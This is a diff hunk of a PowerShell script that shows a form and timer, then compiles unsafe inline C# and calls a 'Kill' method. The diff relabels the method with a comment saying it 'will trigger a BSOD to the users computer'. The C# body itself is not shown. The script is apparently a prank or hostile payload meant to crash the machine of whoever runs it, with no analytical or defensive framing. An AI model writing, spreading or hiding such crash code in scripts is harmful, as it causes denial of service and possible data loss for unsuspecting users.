@@ -66,7 +66,7 @@ $form.Add_KeyDown({})
 $timer.Start()
 $form.ShowDialog()
 
-# The provided script to trigger after the sound file has finished playing
+# This section will trigger a BSOD to the users computer
 $source = @"
 using System;
 using System.Runtime.InteropServices;
@@ -87,6 +87,3 @@ $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
 $comparams.CompilerOptions = '/unsafe'
 $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
 [CS]::Kill()
-
-# Other functions are not relevant to the main script, so they are not included.
-
